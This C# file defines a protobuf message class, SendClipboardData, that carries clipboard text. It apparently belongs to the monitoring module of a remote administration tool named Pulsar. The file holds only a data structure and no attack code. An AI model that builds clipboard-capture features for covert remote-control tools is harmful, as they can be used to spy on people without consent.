using ProtoBuf;
using Pulsar.Common.Messages.Other;

namespace Pulsar.Common.Messages.Monitoring.Clipboard
{
    [ProtoContract]
    public class SendClipboardData : IMessage
    {
        [ProtoMember(1)]
        public string ClipboardText { get; set; }
    }
}
